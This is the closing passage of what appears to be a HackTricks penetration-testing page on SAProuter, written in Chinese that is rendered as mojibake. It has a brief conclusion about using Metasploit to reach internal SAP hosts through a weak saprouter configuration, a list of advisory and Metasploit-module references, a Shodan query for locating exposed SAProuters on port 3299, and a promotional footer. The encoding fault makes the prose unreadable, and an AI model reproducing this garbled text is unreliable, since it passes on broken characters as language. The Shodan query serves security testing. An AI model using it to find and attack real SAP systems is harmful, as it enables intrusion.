æˆ‘ä»¬å·²ç»çœ‹åˆ°äº†å¦‚ä½•åˆ©ç”¨å¼±saprouteré…ç½®ï¼Œä»äº’è”ç½‘ä¸Šè®¿é—®å†…éƒ¨ä¸»æœºï¼Œè€Œè¿™ä¸€åˆ‡åªä½¿ç”¨äº†metasploitå¯¹SAPç³»ç»Ÿè¿›è¡Œæ¸—é€æµ‹è¯•çš„æ”¯æŒã€‚

æˆ‘å¸Œæœ›æœ¬æ–‡èƒ½å¤Ÿå¸®åŠ©æ­ç¤ºsaprouteréƒ¨ç½²æ‰€å¸¦æ¥çš„é£é™©ï¼Œä»¥åŠSAPå®‰å…¨çš„ä¸€èˆ¬æƒ…å†µã€‚

**å‚è€ƒèµ„æ–™**

* [http://labs.mwrinfosecurity.com/blog/2012/09/13/sap-smashing-internet-windows/](http://labs.mwrinfosecurity.com/blog/2012/09/13/sap-smashing-internet-windows/)
* \[[http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2](http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2) - Mariano Nun ez Di Croce - SAProuter .pdf\]\([http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2](http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2) - Mariano Nunez Di Croce - SAProuter .pdf\)
* [http://scn.sap.com/docs/DOC-17124](http://scn.sap.com/docs/DOC-17124)
* [http://help.sap.com/saphelp\_nw70/helpdata/EN/4f/992dfe446d11d189700000e8322d00/f rameset.htm](http://help.sap.com/saphelp_nw70/helpdata/EN/4f/992dfe446d11d189700000e8322d00/frameset.htm)
* [http://help.sap.com/saphelp\_dimp50/helpdata/En/f8/bb960899d743378ccb8372215bb767 /content.htm](http://help.sap.com/saphelp_dimp50/helpdata/En/f8/bb960899d743378ccb8372215bb767/content.htm)
* [http://labs.integrity.pt/advisories/cve-2013-3319/](http://labs.integrity.pt/advisories/cve-2013-3319/)
* [SAP Service Discovery \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_service_discovery)
* [SAPRouter Admin Request \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_info_request)
* [CVE-2013-3319 SAP Host Agent Information Disclosure \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_hostctrl_getcomputersystem)
* [SAPRouter Port Scanner \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_portscanner)

# Shodan

* `port:3299 !HTTP Network packet too big`



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—æœ€æ–°ç‰ˆæœ¬çš„PEASSæˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTrickså—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
